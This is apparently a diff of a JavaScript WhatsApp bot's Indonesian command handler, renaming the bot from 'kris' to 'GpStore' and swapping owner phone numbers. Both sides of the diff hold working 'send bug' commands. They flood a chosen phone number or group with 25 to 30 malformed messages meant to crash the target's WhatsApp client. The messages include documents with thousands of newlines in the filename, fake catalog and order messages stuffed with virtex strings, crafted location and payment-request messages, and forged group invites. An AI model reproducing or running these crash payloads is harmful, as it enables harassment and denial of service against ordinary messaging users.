 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendContact(num, owner, lep)
+GpStore.sendContact(num, owner, lep)
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'docgas':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(num, { 
+GpStore.sendMessage(num, { 
 document: ppnyaimg, 
-fileName: `🔥 kris BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
+fileName: `🔥 GpStore BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyaimg, 
 fileLength: "999999999", 
@@ -2691,42 +2691,42 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'stickgas':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(num, {sticker: ppnyaimg},{ quoted: lep })
+GpStore.sendMessage(num, {sticker: ppnyaimg},{ quoted: lep })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'itemgas': {
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(num, `kris Bot ${virus}${virtex(prefix)}`, `kris Bot ${virus}${virtex(prefix)}`, `kris Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(num, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'cataloggas': {
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: kris.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productMessage": {
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `kris Bot WhatsApp ${virus} ${virtex(prefix)}`,
+"title": `GpStore Bot WhatsApp ${virus} ${virtex(prefix)}`,
 "description": `${virus}${virtex(prefix)}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -2734,28 +2734,28 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/62882007324217`
+"url": `https://wa.me/62858428854987`
 },
-"businessOwnerJid": "62882007324217@s.whatsapp.net",
+"businessOwnerJid": "62858428854987@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
-kris.relayMessage(num, catalog.message, { messageId: catalog.key.id })
+GpStore.relayMessage(num, catalog.message, { messageId: catalog.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'kaylog':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: kris.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `kris Bot WhatsApp ${virus} ${virtex(prefix)}`,
+"title": `GpStore Bot WhatsApp ${virus} ${virtex(prefix)}`,
 "description": `${virus}${virtex(prefix)}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -2763,76 +2763,76 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/62882007324217`
+"url": `https://wa.me/62858428854987`
 },
-"businessOwnerJid": "62882007324217@s.whatsapp.net",
+"businessOwnerJid": "62858428854987@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
-kris.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+GpStore.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayloc':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: kris.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"name": `kris Bot ${virus}${virtex(prefix)}`,
+"name": `GpStore Bot ${virus}${virtex(prefix)}`,
 "url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": `kris Bot ${virus}${virtex(prefix)}`,
+"caption": `GpStore Bot ${virus}${virtex(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 "mtype": "locationMessage"
 }
 }), { userJid: m.chat, quoted: lep })
-kris.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
+GpStore.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kaykontak':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendContact(m.chat, owner, lep)
+GpStore.sendContact(m.chat, owner, lep)
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayitem':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(m.chat, `kris Bot ${virus}${virtex(prefix)}`, `kris Bot ${virus}${virtex(prefix)}`, `kris Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(m.chat, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, `GpStore Bot ${virus}${virtex(prefix)}`, ppnyaimg, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kaystick':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(m.chat, {sticker: ppnyaimg},{ quoted: lep })
+GpStore.sendMessage(m.chat, {sticker: ppnyaimg},{ quoted: lep })
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kaydoc':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(m.chat, { 
+GpStore.sendMessage(m.chat, { 
 document: ppnyaimg, 
-fileName: `🔥 kris BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
+fileName: `🔥 GpStore BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyaimg, 
 fileLength: "999999999", 
@@ -2843,24 +2843,24 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayvn':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+GpStore.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayteks':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.relayMessage(m.chat, {
+GpStore.relayMessage(m.chat, {
 requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `kris Bot ${virus}${virtex(prefix)}`, 
+text: `GpStore Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2872,24 +2872,24 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'santedparah': 
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
-let hdhe = await kris.onWhatsApp(nmn)
+let hdhe = await GpStore.onWhatsApp(nmn)
 if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 santed(bygbt, nmn, sender)
 break
 case 'santetpc':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
-let kgdhwus = await kris.onWhatsApp(tosend)
+let kgdhwus = await GpStore.onWhatsApp(tosend)
 if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 jumlah = '30'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(tosend, {
+GpStore.sendMessage(tosend, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -2904,14 +2904,14 @@ await sleep(1000)
 reply(`Sukses`)
 break
 case 'santetgc':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let resultny = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '30'
 for (let i = 0; i < jumlah; i++) {
-let tosendgc = await kris.groupAcceptInvite(resultny)
-kris.sendMessage(tosendgc, {
+let tosendgc = await GpStore.groupAcceptInvite(resultny)
+GpStore.sendMessage(tosendgc, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -2926,50 +2926,50 @@ await sleep(1000)
 reply(`Sukses`)
 break
 case 'spambugvip':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
 numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
-let cekno = await kris.onWhatsApp(numt)
+let cekno = await GpStore.onWhatsApp(numt)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (isNaN(jumlah)) return reply(`Harus berupa angka`)
-var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '62882007324217@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyaimg, caption: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
+var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '62858428854987@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyaimg, caption: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
 var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
-var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: kris.waUploadToServer })
-var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyaimg,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
+var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyaimg,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
 var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
-var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
-var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
+var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
+var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
